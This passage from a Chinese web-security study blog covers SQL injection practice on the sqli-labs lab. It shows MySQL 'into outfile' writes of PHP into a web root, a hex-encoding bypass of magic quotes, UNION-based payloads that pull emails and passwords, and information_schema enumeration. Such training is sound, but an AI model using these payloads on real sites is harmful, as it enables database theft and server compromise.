outfile <span class="token string">'/var/www/php'</span><span class="token punctuation">;</span>ERROR 1 <span class="token punctuation">(</span>HY000<span class="token punctuation">)</span>: Can<span class="token string">'t create/write to file '</span>/var/www/php' <span class="token punctuation">(</span>Errcode: 13<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><p>在linux中默认是对&#x2F;var&#x2F;lib&#x2F;mysql目录下有写入权限对其他目录是没有写入权限。<br>对目录修改权限测试</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token string">'&lt;?php phpinfo() ?>'</span> into outfile <span class="token string">'/var/www/html/test.php'</span><span class="token punctuation">;</span>ERROR 1 <span class="token punctuation">(</span>HY000<span class="token punctuation">)</span>: Can<span class="token string">'t create/write to file '</span>/var/www/html/test.php<span class="token string">' (Errcode: 13)mysql> \qroot@06026a1599f9:/# chmod -Rf 777 /var/www/html/root@06026a1599f9:/# mysqlmysql> select '</span><span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span> ?<span class="token operator">></span><span class="token string">' into outfile '</span>/var/www/html/test.php'<span class="token punctuation">;</span>mysql<span class="token operator">></span></code></pre><p>在网页上写入<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/12.png"></p><pre class=" language-bash"><code class="language-bash">root@06026a1599f9:/var/lib/mysql<span class="token comment" spellcheck="true"># pwd</span>/var/lib/mysqlroot@06026a1599f9:/var/lib/mysql<span class="token comment" spellcheck="true"># ls -l test.php</span>-rw-rw-rw- 1 mysql mysql 23 Jun 18 12:17 test.phproot@06026a1599f9:/var/lib/mysql<span class="token comment" spellcheck="true"># cat test.php</span>1       <span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span> ?<span class="token operator">></span>      3root@06026a1599f9:/var/lib/mysql<span class="token comment" spellcheck="true">#</span></code></pre><h3 id="四、魔术引号开关"><a href="#四、魔术引号开关" class="headerlink" title="四、魔术引号开关"></a><font size="5"><strong>四、魔术引号开关</strong></font></h3><p>魔术引号设计的初衷是为了让从数据库或文件中读取数据和从请求中接收参数时，<font color=" red"><strong>对单引号、双引号、反斜线、NULL加上一个一个反斜线进行转义</strong></font>，这个的作用跟addslashes()的作用完全相同。</p><p>正确地接收和读取数据，从而正确地执行SQL语句，防止恶意的SQL注入。</p><p>简单的SQL注入示例，假设有一个数据库user，我们要传一个参数查询某个用户的信息，我们会调用某个接口，传一个参数给接口，类似于http:&#x2F;&#x2F;域名&#x2F;?c&#x3D;xxx&amp;a&#x3D;xxx&amp;user&#x3D;xxx，现在我们想查询一个叫codeman的人的信息，那么user&#x3D;codeman，后台接收到参数之后，执行类似于下面的SQL语句。</p><pre class=" language-bash"><code class="language-bash">SELECT * FROM <span class="token variable"><span class="token variable">`</span>user<span class="token variable">`</span></span> WHERE <span class="token variable"><span class="token variable">`</span>user<span class="token variable">`</span></span> <span class="token operator">=</span> <span class="token string">'codeman'</span><span class="token punctuation">;</span></code></pre><p>如果在接收数据时后台不进行转义，那么久可能让恶意的SQL注入攻击发生，假设我们现在传递一个user&#x3D;codeman’or’1’&#x3D;’1，传到后台执行的SQL语句变成：</p><pre class=" language-bash"><code class="language-bash">SELECT * FROM <span class="token variable"><span class="token variable">`</span>user<span class="token variable">`</span></span> WHERE <span class="token variable"><span class="token variable">`</span>user<span class="token variable">`</span></span> <span class="token operator">=</span> <span class="token string">'codeman'</span> or <span class="token string">'1'</span> or <span class="token string">'1'</span><span class="token punctuation">;</span></code></pre><h3 id="●-1、为什么在PHP5-4-0及其之后PHP版本中被取消了呢"><a href="#●-1、为什么在PHP5-4-0及其之后PHP版本中被取消了呢" class="headerlink" title="● 1、为什么在PHP5.4.0及其之后PHP版本中被取消了呢?"></a><font size="4"><strong>● 1、为什么在PHP5.4.0及其之后PHP版本中被取消了呢?</strong></font></h3><pre class=" language-bash"><code class="language-bash">PHP 5.5.9-1ubuntu4.13 <span class="token punctuation">(</span>cli<span class="token punctuation">)</span> <span class="token punctuation">(</span>built: Sep 29 2015 15:24:49<span class="token punctuation">)</span>Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 1997-2014 The PHP GroupZend Engine v2.5.0, Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 1998-2014 Zend Technologies   with Zend OPcache v7.0.3, Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 1999-2014, by Zend Technologiesroot@06026a1599f9:/<span class="token comment" spellcheck="true"># grep magic /etc/php5/apache2/php.ini</span>root@06026a1599f9:/<span class="token comment" spellcheck="true"># grep magic /etc/php5/cli/php.ini</span></code></pre><p>(1)可移植性:<br>编程时认为其打开或并闭都会影响到移植性。可以用 get_magic_quotes_gpc() 来检查是否打开，并据此编程。 </p><p>(2）性能<br>        由于并不是每一段被转义的数据都要插入数据库的，如果所有进入 PHP 的数据都被转义的话，那么会对程序的执行效率产生一定的影响。在运行时调用转义函数（如 addslashes()）更有效率。 尽管 php.ini-dist 默认打开了这个选项，但是 php.ini-recommended 默认却关闭了它，主要是出于性能的考虑。</p><p>（3）方便<br>由于不是所有数据都需要转义，在不需要转义的地方看到转义的数据就很烦。比如说通过表单发送邮件，结果看到一大堆的 ‘。针对这个问题，可以使用 stripslashes() 函数处理。</p><h3 id="●-2、phpstudy环境中PHP版本选择为5-2-17时在php-ini文件中魔术引号的开关"><a href="#●-2、phpstudy环境中PHP版本选择为5-2-17时在php-ini文件中魔术引号的开关" class="headerlink" title="● 2、phpstudy环境中PHP版本选择为5.2.17时在php.ini文件中魔术引号的开关"></a><font size="4"><strong>● 2、phpstudy环境中PHP版本选择为5.2.17时在php.ini文件中魔术引号的开关</strong></font></h3><p><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/13.png"></p><p>选择SQL注入的关卡1阅读源码$sql&#x3D;”SELECT * FROM users WHERE id&#x3D;’$id’ LIMIT 0,1”;这一句中我们要是想注入的话必须让前面的’闭合，但是我们开启了魔术引号开关我发生这样的事情。</p><p><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/14.png"></p><p>就是在我们注入的时候添加的’会在之后会自动添加&#39;将我们注入语句给注释掉从而失败。将魔术引号关闭之后然后重启phpstudy就可以正常的注入。<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/15.png"><br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/16.png"></p><h3 id="●-3、由于docker搭建的环境是PHP5-5版本的没有魔术引号、故不做演示"><a href="#●-3、由于docker搭建的环境是PHP5-5版本的没有魔术引号、故不做演示" class="headerlink" title="● 3、由于docker搭建的环境是PHP5.5版本的没有魔术引号、故不做演示"></a><font size="4"><strong>● 3、由于docker搭建的环境是PHP5.5版本的没有魔术引号、故不做演示</strong></font></h3><p>开启了魔术引号之后<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/16.png"></p><h3 id="●-4、绕过方法"><a href="#●-4、绕过方法" class="headerlink" title="● 4、绕过方法"></a><font size="4"><strong>● 4、绕过方法</strong></font></h3><p>采用<font color=" red"><strong>hex(16进制)</strong></font>编码绕过因为对路径进行编码之后魔术引号不会再对其生效也就是说绕过了魔术引号的作用达到绕过。<br>编码软件:winhex</p><h3 id="五、int函数"><a href="#五、int函数" class="headerlink" title="五、int函数"></a><font size="5"><strong>五、int函数</strong></font></h3><p>对输入的数字进行判断是否</p><pre class=" language-bash"><code class="language-bash">if<span class="token punctuation">(</span>is_int<span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token variable">$result</span><span class="token operator">=</span>mysql_query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>    <span class="token keyword">echo</span> <span class="token string">'ni shi ge jj?'</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span></code></pre><p><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/16.png"></p><p>防护软件一般也是对关键字进行防护、触发了waf等安全软件规则会将数据包丢弃。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-012</title>
      <link href="/2023/09/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-012/"/>
      <url>/2023/09/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-012/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-SQL-注入-一"><a href="#WEB漏洞-SQL-注入-一" class="headerlink" title="WEB漏洞-SQL 注入(一)"></a><font size="6"><strong>WEB漏洞-SQL 注入(一)</strong></font></h2><span id="more"></span><h3 id="一、前言知识"><a href="#一、前言知识" class="headerlink" title="一、前言知识"></a><font size="5"><strong>一、前言知识</strong></font></h3><p>前言：在本系列课程学习中，SQL注入漏洞将是重点部分，其中SQL注入又非常复杂，区分各种数据库类型，提交方法，数据类型等注入，我们需要按部就班的学习，才能学会相关SQL注入的核心。同样此类漏洞是WEB安全中严重的安全漏洞，学习如何利用，挖掘，修复也是很重要的。<br><img src="/2023/09/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-012/1.png"></p><h3 id="二、SQL注入原理"><a href="#二、SQL注入原理" class="headerlink" title="二、SQL注入原理"></a><font size="5"><strong>二、SQL注入原理</strong></font></h3><h4 id="●1-理解SQL注入"><a href="#●1-理解SQL注入" class="headerlink" title="●1.理解SQL注入"></a><font size="4"><strong>●1.理解SQL注入</strong></font></h4><p>  SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的sql服务器加以解析和执行。由于sql语句本身的多样性，以及可用于构造sql语句的编程方法很多，因此凡是构造sql语句的步骤均存在被攻击的潜在风险。Sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态sql命令中时，恶意代码就将被执行。</p><p>  如果web应用未对动态构造的sql语句使用的参数进行正确性审查（即便使用了参数化技术），攻击者就很可能会修改后台sql语句的构造。如果攻击者能够修改sql语句，那么该语句将与应用的用户具有相同的权限。当使用sql服务器执行与操作系统交互命令时，该进程将与执行命令的组件（如数据库服务器、应用服务器或web服务器）拥有相同的权限，这种权限的级别通常很高。如果攻击者执行以上恶意代码的插入操作成功，那么用户数据库服务器或者整个应用会遭到破坏，甚至被控制。 </p><h4 id="●2-sql注入的产生过程及常见原因"><a href="#●2-sql注入的产生过程及常见原因" class="headerlink" title="●2.sql注入的产生过程及常见原因"></a><font size="4"><strong>●2.sql注入的产生过程及常见原因</strong></font></h4><p>  <strong>○2.1产生过程</strong><br>  大多数的web应用都需要与数据库进行交互，并且大多数web应用编程语言（如ASP、C##、.NET、Java和PHP）均提供了可编程的方法来与数据库连接并进行交互。如果web应用开发人员无法确保在将从web表单，cookie及输入参数等收到的值传递给sql查询（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现sql注入漏洞，如果攻击者能够控制发送给sql查询的输入，并且能够操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。</p><p>  <strong>○2.2常见的sql注入产生原因</strong><br>  基于此，SQL注入的产生原因通常表现在以下几方面：①转义字符处理不合适；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤多个提交处理不当。 </p><p>  <strong>○2.2.1不当的处理类型</strong><br>  Sql数据库将单引号字符（’）解析成代码与数据间的分界线：单引号外面的内容军事需要运行的代码，而用单引号引起来的内容均是数据。因为只需要简单的在URL或WEB页面的字段中输入一个单引号，就能很快速的识别出web站点是否会受到sql注入攻击。 </p><p>  <strong>○2.2.2不安全的数据库配置</strong><br>  数据库带有很多默认的用户预安装内容。SQL Server使用声名狼藉的“sa”作为数据库系统管理员账户，MySQL使用“root”和“anonymous”用户账户，Oracle则在创建数据库时通常会创建SYS、SYSTEM、DBSNMP和OUTLN账户。这些并非是全部的账号，知识比较出名的账户中的一部分，还有很多其他的账户。其他账户同样按默认方式进行预设，口令总所周知。</p><p>这就带来了很大的安全风险，攻击者利用sql注入漏洞时，通常会常识访问数据库的元数据，比如内部的数据库和表的名称、列的数据类型和访问权限，例如MySQL服务器的元数据位于information_schema虚拟数据库中，可通过show databases；和show tables；命令访问。所有的MySQL用户均有权限访问该数据库中的表，但只能查看表中那些与该用户访问权限相对应的对象的行。</p><p>  <strong>○2.2.3不合理的查询集处理</strong><br>  有时需要使用动态的sql语句对某些复杂的应用进行编码，因为程序开发阶段可能还不知道要查询的表或字段（或者不存在）。比如与大型数据库交互的应用，这些数据库在定期创建的表中的数据由于应用已经产生了输入，因而开发人员会信任该数据，攻击者可以使用自己的表和字段数据来替换应用产生的值，从而影响系统的返回值。</p><p>  <strong>○2.2.4不当的错误处理</strong><br>  错误处理不当会为web站点带来很多安全方面的问题。最常见的问题是将详细的内部错误消息（如错误代码，数据库转存储）显示给用户或攻击。这些错误消息会泄露实现细节，为攻击者提供与网站潜在缺陷相关的重要线索。 </p><p>  <strong>○2.2.5多个提交处理不当</strong><br>  大型的web开发项目会出现这样的问题：有些开发人员会对输入进行验证，而一些开发人员则不以为然。对于开发人员，团队，甚至公司来说，彼此独立工作的情形并不少见，很难保证项目中每个人都遵循相同的标准。</p><p>应用打开发人员还倾向于围绕用户来设计应用，他们尽可能的使用预期的处理流程来引导用户，认为用户将遵循他们已经设计好的逻辑顺序。</p><p>例如：当用户已到达一系列表单中的第三个表单时，他们会期望用户肯定已经完成第一个和第二个表达。但实际上，借助URL乱序来请求资源，能够非常容易的避开预期的数据流程。 </p><h3 id="三、mysql注入"><a href="#三、mysql注入" class="headerlink" title="三、mysql注入"></a><font size="5"><strong>三、mysql注入</strong></font></h3><p><img src="/2023/09/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-012/2.png"></p><h3 id="四、忍者系统安装"><a href="#四、忍者系统安装" class="headerlink" title="四、忍者系统安装"></a><font size="5"><strong>四、忍者系统安装</strong></font></h3><p>参考博客：<a href="https://blog.csdn.net/qq_35258210/article/details/115457883">https://blog.csdn.net/qq_35258210/article/details/115457883</a></p><p>将镜像下载好使用VM安装，我给该系统分配了70个G硬盘，6G内存<br>镜像下载链接：链接: <a href="https://pan.baidu.com/s/1CAw9ztIUhCZgydNWHHWINg">https://pan.baidu.com/s/1CAw9ztIUhCZgydNWHHWINg</a> 密码: a33b</p><p><strong>注意：</strong><br>1、刚开始安装的时候vm可能无法读取到镜像、在进入的时候按enter键，其余的步骤和上面的博客一致、不在赘述。安装完成后截图,由于忍者系统是基于win10开发的而内存也给的相对比较大在使用的过程中很有可能出现卡顿的情况建议使用vm player打开忍者系统。</p><p>2、开始使用的时候忍者系统有两个网卡建议禁用两个让其中的一个通信<br>密码：toor<br><img src="/2023/09/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-012/3.png"><br><img src="/2023/09/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-012/4.png"><br><img src="/2023/09/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-012/5.png"></p><h3 id="五、sql注入靶场搭建"><a href="#五、sql注入靶场搭建" class="headerlink" title="五、sql注入靶场搭建"></a><font size="5"><strong>五、sql注入靶场搭建</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@oldjiang ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker pull acgpiano/sqli-labs</span><span class="token punctuation">[</span>root@oldjiang ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker run -dt --name sqli -p 80:80 -p 13306:3306 --rm acgpiano/sqli-labs</span><span class="token punctuation">[</span>root@oldjiang ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker exec -it sqli /bin/bash</span></code></pre><p><strong>●访问</strong><br><img src="/2023/09/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-012/6.png"><br><img src="/2023/09/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-012/7.png"><br><strong>●查看源代码</strong></p><pre class=" language-bash"><code class="language-bash">root@1f9ac3840241:/<span class="token comment" spellcheck="true"># cat /var/www/html/Less-2/index.php</span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html PUBLIC <span class="token string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="token string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span><span class="token operator">></span><span class="token operator">&lt;</span>html xmlns<span class="token operator">=</span><span class="token string">"http://www.w3.org/1999/xhtml"</span><span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span><span class="token operator">&lt;</span>meta http-equiv<span class="token operator">=</span><span class="token string">"Content-Type"</span> content<span class="token operator">=</span><span class="token string">"text/html; charset=utf-8"</span> /<span class="token operator">></span><span class="token operator">&lt;</span>title<span class="token operator">></span>Less-2 **Error Based- Intiger**<span class="token operator">&lt;</span>/title<span class="token operator">></span><span class="token operator">&lt;</span>/head<span class="token operator">></span><span class="token operator">&lt;</span>body bgcolor<span class="token operator">=</span><span class="token string">"#000000"</span><span class="token operator">></span><span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">" margin-top:60px;color:#FFF; font-size:23px; text-align:center"</span><span class="token operator">></span>Welcome<span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token operator">&lt;</span>font color<span class="token operator">=</span><span class="token string">"#FF0000"</span><span class="token operator">></span> Dhakkan <span class="token operator">&lt;</span>/font<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>font size<span class="token operator">=</span><span class="token string">"3"</span> color<span class="token operator">=</span><span class="token string">"#FFFF00"</span><span class="token operator">></span><span class="token operator">&lt;</span>?php//including the Mysql connect parameters.include<span class="token punctuation">(</span><span class="token string">"../sql-connections/sql-connect.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>error_reporting<span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span>// take the variablesif<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>//logging the connection parameters to a <span class="token function">file</span> <span class="token keyword">for</span> analysis.<span class="token variable">$fp</span><span class="token operator">=</span>fopen<span class="token punctuation">(</span><span class="token string">'result.txt'</span>,<span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fwrite<span class="token punctuation">(</span><span class="token variable">$fp</span>,<span class="token string">'ID:'</span><span class="token keyword">.</span><span class="token variable">$id</span><span class="token keyword">.</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fclose<span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>// connectivity<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span>mysql_query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span> mysql_fetch_array<span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        if<span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;font size='5' color= '#99FF00'>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'Your Login name:'</span><span class="token keyword">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'Your Password:'</span> <span class="token keyword">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;/font>"</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        <span class="token keyword">else</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#FFFF00">'</span><span class="token punctuation">;</span>        print_r<span class="token punctuation">(</span>mysql_error<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;/font>"</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        <span class="token keyword">else</span>                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                <span class="token keyword">echo</span> <span class="token string">"Please input the ID as parameter with numeric value"</span><span class="token punctuation">;</span>                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>?<span class="token operator">></span><span class="token operator">&lt;</span>/font<span class="token operator">></span> <span class="token operator">&lt;</span>/div<span class="token operator">></span><span class="token operator">&lt;</span>/br<span class="token operator">></span><span class="token operator">&lt;</span>/br<span class="token operator">></span><span class="token operator">&lt;</span>/br<span class="token operator">></span><span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"../images/Less-2.jpg"</span> /<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span><span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span></code></pre><p><strong>备注：</strong>在上面的代码中可以看到$sql&#x3D;”SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1”;直接传递的变量$id带入sql语句中执行没有做任何的限制，这样为恶意代码插入执行创造了条件。通过修改带入的代码执行的语句最终达到SQL注入获取敏感信息</p><p><strong>● 在数据库中执行:</strong><br>id&#x3D;-1 是为了让回显的结果为空执行后面union的字句。</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span><span class="token punctuation">;</span>+----+----------+------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password   <span class="token operator">|</span>+----+----------+------------+<span class="token operator">|</span>  1 <span class="token operator">|</span> Dumb     <span class="token operator">|</span> Dumb       <span class="token operator">|</span><span class="token operator">|</span>  2 <span class="token operator">|</span> Angelina <span class="token operator">|</span> I-kill-you <span class="token operator">|</span><span class="token operator">|</span>  3 <span class="token operator">|</span> Dummy    <span class="token operator">|</span> p@ssword   <span class="token operator">|</span><span class="token operator">|</span>  4 <span class="token operator">|</span> secure   <span class="token operator">|</span> crappy     <span class="token operator">|</span><span class="token operator">|</span>  5 <span class="token operator">|</span> stupid   <span class="token operator">|</span> stupidity  <span class="token operator">|</span><span class="token operator">|</span>  6 <span class="token operator">|</span> superman <span class="token operator">|</span> genious    <span class="token operator">|</span><span class="token operator">|</span>  7 <span class="token operator">|</span> batman   <span class="token operator">|</span> mob<span class="token operator">!</span>le     <span class="token operator">|</span><span class="token operator">|</span>  8 <span class="token operator">|</span> admin    <span class="token operator">|</span> admin      <span class="token operator">|</span><span class="token operator">|</span>  9 <span class="token operator">|</span> admin1   <span class="token operator">|</span> admin1     <span class="token operator">|</span><span class="token operator">|</span> 10 <span class="token operator">|</span> admin2   <span class="token operator">|</span> admin2     <span class="token operator">|</span><span class="token operator">|</span> 11 <span class="token operator">|</span> admin3   <span class="token operator">|</span> admin3     <span class="token operator">|</span><span class="token operator">|</span> 12 <span class="token operator">|</span> dhakkan  <span class="token operator">|</span> dumbo      <span class="token operator">|</span><span class="token operator">|</span> 14 <span class="token operator">|</span> admin4   <span class="token operator">|</span> admin4     <span class="token operator">|</span>+----+----------+------------+13 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> * from emails<span class="token punctuation">;</span>+----+------------------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> email_id               <span class="token operator">|</span>+----+------------------------+<span class="token operator">|</span>  1 <span class="token operator">|</span> Dumb@dhakkan.com       <span class="token operator">|</span><span class="token operator">|</span>  2 <span class="token operator">|</span> Angel@iloveu.com       <span class="token operator">|</span><span class="token operator">|</span>  3 <span class="token operator">|</span> Dummy@dhakkan.local    <span class="token operator">|</span><span class="token operator">|</span>  4 <span class="token operator">|</span> secure@dhakkan.local   <span class="token operator">|</span><span class="token operator">|</span>  5 <span class="token operator">|</span> stupid@dhakkan.local   <span class="token operator">|</span><span class="token operator">|</span>  6 <span class="token operator">|</span> superman@dhakkan.local <span class="token operator">|</span><span class="token operator">|</span>  7 <span class="token operator">|</span> batman@dhakkan.local   <span class="token operator">|</span><span class="token operator">|</span>  8 <span class="token operator">|</span> admin@dhakkan.com      <span class="token operator">|</span>+----+------------------------+8 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span>-1 LIMIT 0,1<span class="token punctuation">;</span><span class="token comment" spellcheck="true">#显示的结果为空、因为没有id=-1的字段</span>Empty <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span>-1 union  <span class="token keyword">select</span> 1,email_id,3 from emails LIMIT 0,1<span class="token punctuation">;</span>+----+------------------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username         <span class="token operator">|</span> password <span class="token operator">|</span>+----+------------------+----------+<span class="token operator">|</span>  1 <span class="token operator">|</span> Dumb@dhakkan.com <span class="token operator">|</span> 3        <span class="token operator">|</span>+----+------------------+----------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span></code></pre><p><strong>● 在网页中执行</strong><br>%20在网页的URL编码中为空格，在id&#x3D;-2添加代码：union  select 1,email_id,3 from emails</p><p><img src="/2023/09/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-012/8.png"></p><p><strong>总结：</strong>可控变量，带入数据库查询，变量未存在过滤或过滤不严谨。</p><p>测试题:参数x有注入，以下那个注入测试正确?</p><pre class=" language-bash"><code class="language-bash">a. www.xiaodi8.com/news.php?y<span class="token operator">=</span>1 and 1<span class="token operator">=</span>1<span class="token operator">&amp;</span>x<span class="token operator">=</span>2b. www.xiaodi8.com/news.php?y<span class="token operator">=</span>1<span class="token operator">&amp;</span>x<span class="token operator">=</span>2 and 1<span class="token operator">=</span>1c. www .xiaodi8.com/news.php?y<span class="token operator">=</span>1 and 1<span class="token operator">=</span>1<span class="token operator">&amp;</span>x<span class="token operator">=</span>2 and 1<span class="token operator">=</span>1d. www .xiaodi8.com/news.php?xx<span class="token operator">=</span>1 and 1<span class="token operator">=</span>1<span class="token operator">&amp;</span>xxx<span class="token operator">=</span>2 and 1<span class="token operator">=</span>1</code></pre><p><strong>●判断是否存在注入点</strong></p><pre class=" language-bash"><code class="language-bash">1、逻辑值    and 1 <span class="token operator">=</span> 1页面正常    and 1 <span class="token operator">=</span> 2页面异常    则可能存在注入点2、order by        通过order by 判断注入的字段数</code></pre><p><strong>●信息收集</strong></p><pre class=" language-bash"><code class="language-bash">数据库版本：version<span class="token punctuation">(</span><span class="token punctuation">)</span>数据库名字：database<span class="token punctuation">(</span><span class="token punctuation">)</span>数据库用户：user<span class="token punctuation">(</span><span class="token punctuation">)</span>操作系统：@@version_compile_os</code></pre><p><strong>●版本探测的意义</strong></p><pre class=" language-bash"><code class="language-bash">在mysql5.0以后的版本存在一个information_schema数据库、里面存储记录数据库名、表名、列名的数据库相当于可以通过information_schema这个数据库获取到数据库下面的表名和列名。</code></pre><p><strong>●获取相关信息</strong></p><pre class=" language-bash"><code class="language-bash">information_schema.tables<span class="token comment" spellcheck="true">#information_schema下面的所有表名</span>information_schema.columns<span class="token comment" spellcheck="true">#information_schema下面所有的列名</span>table_name<span class="token comment" spellcheck="true">#表名</span>column_name<span class="token comment" spellcheck="true">#列名</span>table_schema<span class="token comment" 